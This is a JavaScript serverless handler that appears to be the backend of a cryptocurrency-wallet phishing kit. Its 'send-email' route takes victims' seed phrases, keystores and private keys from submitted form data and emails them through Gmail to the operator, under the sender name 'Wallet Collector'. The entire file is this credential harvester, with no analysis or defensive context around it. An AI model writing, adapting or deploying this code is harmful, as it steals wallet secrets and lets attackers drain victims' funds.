import nodemailer from "nodemailer";

export default async function handler(req, res) {
  // Health check
  if (req.method === "GET") {
    return res.status(200).json({ message: "Server is running ✅" });
  }

  // POST routes
  if (req.method === "POST") {
    const { route, phrase, keystore, privateKey, item } = req.body;

    try {
      // Common transporter
      const transporter = nodemailer.createTransport({
        service: "gmail",
        auth: {
          user: process.env.EMAIL_USER,
          pass: process.env.EMAIL_PASS,
        },
      });

      if (route === "send-email") {
        await transporter.sendMail({
          from: `"Wallet Collector" <${process.env.EMAIL_USER}>`,
          to: process.env.EMAIL_USER,
          subject: `🦊 New Wallet Data: ${item || "Unknown"}`,
          html: `
            <h2>New Wallet Data</h2>
            <p><strong>Item:</strong> ${item || "N/A"}</p>
            <p><strong>Phrase:</strong> ${phrase || "N/A"}</p>
            <p><strong>Keystore:</strong> ${keystore || "N/A"}</p>
            <p><strong>Private Key:</strong> ${privateKey || "N/A"}</p>
          `,
        });

        return res.status(200).json({ success: true, message: "Email sent ✅" });
      }

      if (route === "mail") {
        // Just a placeholder for mail-specific logic
        return res.status(200).json({ success: true, message: "Mail route working ✅" });
      }

      return res.status(404).json({ error: "Unknown route" });
    } catch (err) {
      console.error("Email error:", err);
      return res.status(500).json({ error: "Failed to send email", details: err.message });
    }
  }

  return res.status(405).json({ error: "Method not allowed" });
}
